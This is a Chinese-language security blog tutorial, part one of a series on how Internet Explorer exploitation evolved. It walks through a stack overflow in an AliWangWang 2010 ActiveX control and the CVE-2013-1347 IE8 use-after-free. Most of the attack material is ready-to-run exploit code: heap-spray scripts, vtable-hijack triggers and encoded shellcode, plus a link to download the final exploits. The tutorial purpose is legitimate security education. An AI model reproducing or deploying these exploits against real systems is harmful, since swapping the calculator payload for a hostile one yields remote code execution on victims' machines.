> 原文链接: https://www.anquanke.com//post/id/84551 


# 【技术分享】 ​IE浏览器漏洞利用技术的演变 (  一  )


                                阅读量   
                                **113369**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p0.ssl.qhimg.com/t012057ac40fc07747a.png)](https://p0.ssl.qhimg.com/t012057ac40fc07747a.png)**

** **

****

**作者：**[**hac425**](http://bobao.360.cn/member/contribute?uid=2553709124)

**稿费：500RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**



****

**传送门**

【技术分享】 IE浏览器漏洞利用技术的演变 ( 二） [http://bobao.360.cn/learning/detail/3029.html](http://bobao.360.cn/learning/detail/3029.html)

**<br>**

**IE浏览器漏洞利用技术的演变**

******注：文章中涉及的软件，或dll, 即最终的 exp:  **

**[https://yunpan.cn/OckK8EjZnR9cGj](https://yunpan.cn/OckK8EjZnR9cGj)（提取码：2a79)**

**<br>**

现今，浏览器是用户接入互联网的门户。浏览器从诞生之初主要提供简单的文档阅读功能，很少构成网络安全威胁，但随着互联网的高速发展，越来越多的功能集被加入到浏览器中。浏览器不仅需要像操作系统那样，为阅读文档、观看电影、欣赏音乐等传统计算机应用提供基础，也需要为社交网络、网络购物等新兴互联网应用提供支持。浏览器在增加功能集的同时， 也就带来了更多的安全问题。同时又由于IE是 windows的默认浏览器, 所以hacker 们对 IE 的漏洞十分感兴趣. 关注的人多了,IE浏览器相关的漏洞利用技术也就发展的很快。

 早期hacker 们挖掘 IE浏览器漏洞,挖到的绝大部分是一些缓冲区溢出 或者是 ActiveX控件漏洞,这些漏洞中有很多是栈溢出类型的漏洞这类漏洞,利用起来非常的方便,直接使用过长字符串覆盖函数返回地址,我们就可以控制程序的执行流程. 此时的漏洞利用和其他软件的漏洞利用技术差不多,即先通过输入数据布置好栈上的数据,然后将返回地址覆盖为 jmp esp 之类的指令的地址,这样一来在函数返回时我们就能控制程序执行到我们输入的数据中,这样我们就能 干我们想干的事情了. 浏览器毕竟和其他类型软件不一样,浏览器实现了许多的功能, 其中很大一部分都是基于的堆实现的,所以很多时候 hacker 会发现 :挖到了一个漏洞 ,也劫持了 eip 控制了程序流程,但是不能控制栈上的内容,或者能控制的内容的长度非常小,以至于连一个弹框的 shellcode 都不能布置上去.难道 hacker 们就这样放弃了吗? 当然没有 , 有了问题咱就解决问题.来看看我们现在拥有的条件. 1. eip 可控 2.不能在栈上布置 shellcode . 既然栈上不行 , 那咱就可以将我们的 shellcode布置到堆上 , 之后我们在将 eip 指向 堆中的shellcode 即可.这样又来了一个难题,我们知道 堆的分配是动态的,即分配的堆块的地址是不固定的,会变化的.为了解决这一困难 ,  hackers 发明了一种技术 →  Heap Spraying 即 堆喷射技术 , 该技术在 浏览器中的大致原理是 ,通过使用浏览器的支持的一些脚本语言, 如 javascript ,vbscript , actionscript ….. , 申请大量的内存,这样我们就有可能使内存中的某个地址恰好指向我们的数据.通过这样一种技术, 我们现在的拥有的条件是:  1.EIP可控 2. 我们输入数据的地址可知. 不考虑一些漏洞利用缓解措施, 如 DEP ,  栈cookies 等, 我们就能实现代码执行。扯了这么久来实践一把吧。

这里用的漏洞是 阿里旺旺2010 的 ActiveX控件的一个栈溢出漏洞, 测试环境为 xp sp3 IE6,可以通过在控制面板中卸载 ie8 得到 ie6漏洞的原理是 其控件的 imageMan.dll 中的AutoPic 函数由于未对参数的长度进行有效的检测 ,导致存在栈溢出漏洞.先用一段小html代码验证下漏洞是否是这样.

poc代码如下:



```
&lt;html&gt;
 &lt;body&gt;
 &lt;object classid="clsid:128D0E38-1FF4-47C3-B0F7-0BAF90F568BF" id="target"&gt;&lt;/object&gt;
 &lt;script&gt;
 var buffer = '';
 while (buffer.length &lt; 1111) buffer+="A";
 target.AutoPic(buffer,"defaultV");
 &lt;/script&gt;
 &lt;/body&gt;
&lt;/html&gt;
```

其大致流程为, 获取 ActiveX控件 对象, 之后调用 对象的 AutoPic 方法,并向它传入 很长的一段 A ,来触发漏洞.打开浏览器, 用调试器附加上去, 打开 poc 页面, 出发异常 , 查看 SEH 链 ,可以看到 SEH 链的被覆盖

[![](https://p1.ssl.qhimg.com/t011605bfba8722a5ee.png)](https://p1.ssl.qhimg.com/t011605bfba8722a5ee.png)

我们就能利用 SEH 来实现任意代码执行.同时可以看到,此时的栈并没有我们的输入数据,故我们应该使用 堆喷射技术 将咱们的 shellcode 喷射到可预测的地址来完成最后的漏洞利用.这里给出一个可以在 IE 6, 7上稳定喷射内存到 0x0c0c0c0c 地址处的堆喷射脚本, 以后要喷射内存时,直接贴到 exp 前面使用即可.



```
&lt;html&gt;
&lt;script &gt;
var shellcode = unescape('%u4141%u4141');
var bigblock = unescape('%u9090%u9090');
var headersize = 20;
var slackspace = headersize + shellcode.length;
while (bigblock.length &lt; slackspace) bigblock += bigblock;
var fillblock = bigblock.substring(0,slackspace);
var block = bigblock.substring(0,bigblock.length - slackspace);
while (block.length + slackspace &lt; 0x40000) block = block + block + fillblock;
var memory = new Array();
for (i = 0; i &lt; 500; i++)`{` memory[i] = block + shellcode `}`
&lt;/script&gt;
&lt;script&gt;
(1);
&lt;/script&gt;
&lt;/html&gt;
```

会创建由一大块 由nop指令 + shellcode 的内存块,之后重复分配 500次,以将数据块喷射到 0x0c0c0c0c处.我们来看看是否能喷射内存到可预测的地址上去,保存 上述内容到一个文件中 ,用调试器附加到 IE浏览器上打开 poc 文件,在 弹出 1 对话框时 ,在调试器中将 ie进程中断下来,查看 0x0c0c0c0c 处的内存数据.

[![](https://p2.ssl.qhimg.com/t01a4ffec7d27a35895.png)](https://p2.ssl.qhimg.com/t01a4ffec7d27a35895.png)

可 以看到 地址 0x0c0c0c0c 处的值为 大量的 0x90(即 nop指令的16进制)  从堆喷射脚本可以知道 该地址位于我们 nop + shellcode 块的 nop 区 ,如果我们将 eip 劫持到 0x0c0c0c0c 处, 程序就会执行大量的 nop 指令,最后会执行到我们的 shellcode 中.  那么,我将最初那个触发漏洞脚本的内容贴到 堆喷射代码的后面 ,并改变传入漏洞函数的参数为 一大串的 “x0c”  ,并添加上我们的 shellcode 这里我用的是 弹出一个计算器.最终的 exploit 代码:



```
&lt;html&gt;
&lt;script &gt;
var shellcode = unescape(
 '%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+
 '%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+
 '%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+
 '%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+
 '%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+
 '%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+
 '%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+
 '%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e');
var bigblock = unescape('%u9090%u9090');
var headersize = 20;
var slackspace = headersize + shellcode.length;
while (bigblock.length &lt; slackspace) bigblock += bigblock;
var fillblock = bigblock.substring(0,slackspace);
var block = bigblock.substring(0,bigblock.length - slackspace);
while (block.length + slackspace &lt; 0x40000) block = block + block + fillblock;
var memory = new Array();
for (i = 0; i &lt; 500; i++)`{` memory[i] = block + shellcode `}`
&lt;/script&gt;
&lt;script&gt;
(1);
&lt;/script&gt;
 &lt;object classid="clsid:128D0E38-1FF4-47C3-B0F7-0BAF90F568BF" id="target"&gt;&lt;/object&gt;
 &lt;script&gt;
 var buffer = '';
 while (buffer.length &lt; 1111) buffer+= "x0c";
 target.AutoPic(buffer,"defaultV");
 &lt;/script&gt;
&lt;/html&gt;
```



保存内容,打开网页 ,就可弹出一个计算器, 干净利落.

上面那种类型的漏洞流行于 03年-08年, 由于缓冲区溢出类的漏洞挖掘较为容易 , 所以没过多久,这一类型的漏洞就被 hacker 们挖的差不多了, 于是 hacker 们又纷纷转向 堆相关漏洞的挖掘 , 于是 08年之后释放重利用这种堆相关漏洞利用方式变成了IE漏洞的主流.逐渐在这几年达到了高峰.对象畸形操作类的漏洞一般来说触发漏洞需要一系列的操作.单个的操作，比方说对象的创建使用删除都是正常的。导致问题的是对于对象操作的畸形的组合.比如一个对象释放后 引用计数没有清0 , 导致我们可以使用已经释放的内存,又比如 我们新建对象时 ,申请到了一块为初始化的内存 等等 这些都会造成一些安全问题, 甚至可能导致 远程代码执行.

话不多说,直接开干. 这里用的漏洞是 CVE-2013-1347-Microsoft IE  UAF漏洞.测试环境为 win7 32 , mshtml.dll 的文件版本 为 : 8.00.7601.17514.  漏洞的原理 : CGnericElement在被释放后 ,我们仍然可以使用 它的那块内存, 而当我们调用对象的函数时就有可能引用非法内存的值作为 函数指针, 最后造成远程代码执行漏洞. 这里在介绍一个背景知识 , 跟面向过程的编程语言不同，c++支持多态和继承。支持这些机制的核心就是虚表。C++的(虚)函数指针位于一个全局数组中，形成虚表。而指向这个虚表的指针(VSTR)一般位于对象实例在内存中开始的4个字节(32位系统) 之后才是类中声明的数据成员，一般按照声明的先后顺序排列。对于存在多态行为的类，子类的所有实例共享相同的虚表，但区别于父类的虚表。对于某个对象，其 调用存在多态行为的某个函数时，会先通过虚表指针得到虚表.再根据函数在虚表中的偏移来得到相应的函数指针，最后才会调用函数.    最后总结一下:  一个对象创建后 ,会在内存中占用一定的空间, 如果对象有虚函数调用的话(ie 中的对象基本都有 ) ,其内存块开头的 4 字节 会指向一个 叫做 虚表的东西 , 当 对象调用虚函数时 首先会 取出 虚表指针 (即 开头的 4字节) ,再到 虚表处根据所调用函数对虚表的相对偏移找到函数指针 , 最终 跳到 函数指针处执行 .

其 汇编代码的 大致呈现 为 &lt;假定 ecx 指向对象&gt;:

mov eax , [ecx]

call [eax + 偏移]

通过这么一大串的对对象虚函数调用过程的描述, 你应该大致猜到了 对于 UAF 漏洞利用的 通用的方式, 没错就是 ,在 存在漏洞的对象释放后 ,使用另外一种对象 来占用刚刚被释放的内存块, 我们称之为 “占坑”, 之后在用这个对象来修改虚表指针的值 来伪造一个虚表, 最后再让漏洞对象调用他的一个虚函数,我们可以通过先前伪造的虚表 ,将此处调用的函数的指针设为 我们 shellcode 的地址, 那么这样,漏洞对象一调用函数,就会跳到 shellcode 中来执行.

下面回到这个漏洞来, 通过对漏洞的调试分析,可以弄清楚存在 UAF 漏洞的 CgnericElement 对象的大小为0x4c  , 那么如果我们要利用这个漏洞,就需要在漏洞对象被释放后,通过申请相同大小的内存来使用这块 “邪恶” 的内存, 将其开头4字节伪造成我们可控数据的地址处,来进一步伪造虚表.在 IE8中恰好有一个 t:ANIMATECOLO 标签,通过利用该标签我们可以实现上面的目标. t:ANIMATECOLO标签值是一个用分号分隔的字符串,分号的个数决定对象的大小.对象的每个元素都是一个指针,指向分隔出来的字符串.应为漏洞对象的大小为 0x4c所以这里需要包含 0x4c/4 =0x13 个分号的字符串.通过分析崩溃时的情景,可以发现对象是在调用偏移虚表 0x70的地方的函数时,造成了崩溃.



```
mshtml!CElement::Doc:
 6586c815 8b01            mov     eax,dword ptr [ecx]
 6586c817 8b5070        mov     edx,dword ptr [eax+70h]
 6586c81a ffd2              call    edx
因此我们在代码中使用 0x70 /4 精确控制 edx .具体看POC中的注释.
Poc:
&lt;!doctype html&gt;
&lt;HTML XMLNS:t ="urn:schemas-microsoft-com:time"&gt;
&lt;head&gt;
&lt;meta&gt;
 &lt;?IMPORT namespace="t" implementation="#default#time2"&gt;
&lt;/meta&gt;
&lt;script&gt;
function helloWorld()
`{`
 animvalues = "";  
 // mshtml!CElement::Doc:
 // 6586c815 8b01            mov     eax,dword ptr [ecx]
 // 6586c817 8b5070          mov     edx,dword ptr [eax+70h]
 // 6586c81a ffd2            call    edx
 for (i=0; i &lt;= 0x70/4; i++) `{`
 // t:ANIMATECOLOR 标签第一个对象用于覆盖虚表指针
 // 由于索引虚函数时，需要偏移0x70，所以这里采用0x70/4去精确控制edx值
 if (i == 0x70/4) `{`
 //animvalues += unescape("%u5ed5%u77c1");    
 animvalues += unescape("%u4141%u4141");   // 控制edx=0x41414141
 `}`
 else `{`
 animvalues += unescape("%u4242%u4242");   // 0x42424242
 `}` 
 `}`
 for(i = 0; i &lt; 13; i++) `{`
 // t:ANIMATECOLOR 标签值是一个用分号分隔的字符串，分号的个数决定对象的大小，
 // 对象的每个元素都是一个指针，指向分号分隔出来的字符串
 // 漏洞对象CGnericElement大小0x4c，所以这里需要包含0x4c/4=13个分号的字符串
 animvalues += ";red"; 
 `}`
 f0 = document.createElement('span');
 document.body.appendChild(f0);
 f1 = document.createElement('span');
 document.body.appendChild(f1);
 f2 = document.createElement('span');
 document.body.appendChild(f2);
 document.body.contentEditable="true";
 f2.appendChild(document.createElement('datalist'));
 f1.appendChild(document.createElement('span'));
 f1.appendChild(document.createElement('table'));
 try`{`
 f0.offsetParent=null;
 `}`catch(e) `{``}`
 f2.innerHTML="";
 f0.appendChild(document.createElement('hr'));
 f1.innerHTML="";
 CollectGarbage();
 try `{`
 //使用 t:ANIMATECOLOR 标签可以自由设置其内容，控制对象大小
 a = document.getElementById('myanim');
 a.values = animvalues;
 `}`
 catch(e) `{``}`
`}`
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="eval(helloWorld());"&gt;
&lt;t:ANIMATECOLOR id="myanim"/&gt;
&lt;/body&gt;
&lt;/html&gt;
```



使用ie 访问页面,调试器附加到 ie上，

[![](https://p3.ssl.qhimg.com/t01b2062e9179aabb62.png)](https://p3.ssl.qhimg.com/t01b2062e9179aabb62.png)

可以看到程序执行到了　0x41414141 处，我们成功劫持了程序的执行流程．下面不考虑　dep 的话，直接在漏洞触发代码前面使用一个　ie8的堆喷射脚本，在修改下指针控制的值为　0x0c0c0c0c,我们就能实现代码执行了．最终的exp 代码如下：



```
&lt;!doctype html&gt;
&lt;HTML XMLNS:t ="urn:schemas-microsoft-com:time"&gt;
&lt;head&gt;
&lt;meta&gt;
 &lt;?IMPORT namespace="t" implementation="#default#time2"&gt;
&lt;/meta&gt;
&lt;script&gt;
 // [ Shellcode ]
var shellcode = unescape(
"%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30" +
"%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031" +
"%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752" +
"%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a" +
"%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34" +
"%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475" +
"%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" +
"%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424" +
"%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86" +
"%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff" +
"%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c" +
"%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5" +
"%u6c61%u2e63%u7865%u0065");
 var fill = unescape("%u0c0c%u0c0c");
 while (fill.length &lt; 0x1000)`{`
 fill += fill;
 `}`
 // [ padding offset ]
 padding = fill.substring(0, 0x5F6);
 // [ fill each chunk with 0x1000 bytes ]
 evilcode = padding + shellcode + fill.substring(0, 0x800 - padding.length - shellcode.length);
 // [ repeat the block to 512KB ]
 while (evilcode.length &lt; 0x40000)`{`
 evilcode += evilcode;
 `}`
 // [ substring(2, 0x40000 - 0x21) - XP SP3 + IE8 ]
 var block = evilcode.substring(2, 0x40000 - 0x21);
 // [ Allocate 200 MB ]
 var slide = new Array();
 for (var i = 0; i &lt; 400; i++)`{`
 slide[i] = block.substring(0, block.length);
 `}`
(1);
&lt;/script&gt;
&lt;script&gt;
function helloWorld()
`{`
 animvalues = "";  
 for (i=0; i &lt;= 0x70/4; i++) `{`
 // t:ANIMATECOLOR 标签第一个对象用于覆盖虚表指针
 // 由于索引虚函数时，需要偏移0x70，所以这里采用0x70/4去精确控制edx值
 if (i == 0x70/4) `{`
 animvalues += unescape("%u0c0c%u0c0c");   // 控制edx
 `}`
 else `{`
 animvalues += unescape("%u4242%u4242");   // 0x42424242
 `}` 
 `}`
 for(i = 0; i &lt; 13; i++) `{`
 // t:ANIMATECOLOR 标签值是一个用分号分隔的字符串，分号的个数决定对象的大小，
 // 对象的每个元素都是一个指针，指向分号分隔出来的字符串
 // 漏洞对象CGnericElement大小0x4c，所以这里需要包含0x4c/4=13个分号的字符串
 animvalues += ";red"; 
 `}`
 f0 = document.createElement('span');
 document.body.appendChild(f0);
 f1 = document.createElement('span');
 document.body.appendChild(f1);
 f2 = document.createElement('span');
 document.body.appendChild(f2);
 document.body.contentEditable="true";
 f2.appendChild(document.createElement('datalist'));
 f1.appendChild(document.createElement('span'));
 f1.appendChild(document.createElement('table'));
 try`{`
 f0.offsetParent=null;
 `}`catch(e) `{``}`
 f2.innerHTML="";
 f0.appendChild(document.createElement('hr'));
 f1.innerHTML="";
 CollectGarbage();
 try `{`
 //使用 t:ANIMATECOLOR 标签可以自由设置其内容，控制对象大小
 a = document.getElementById('myanim');
 a.values = animvalues;
 `}`
 catch(e) `{``}`
`}`
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload="eval(helloWorld());"&gt;
&lt;t:ANIMATECOLOR id="myanim"/&gt;
&lt;/body&gt;
&lt;/html&gt;
```



今天真是邪门了，不知道为啥我开启了dep 还是能够执行，

[![](https://p0.ssl.qhimg.com/t012057ac40fc07747a.png)](https://p0.ssl.qhimg.com/t012057ac40fc07747a.png)

这次就到这，下次补充rop部分，以及 14 -16年的IE漏洞利用部分，谢谢！



**<br>**

**参考文献**



林桠泉.      漏洞战争：软件漏洞分析精要[M]. 北京:电子工业出版社, 2016.
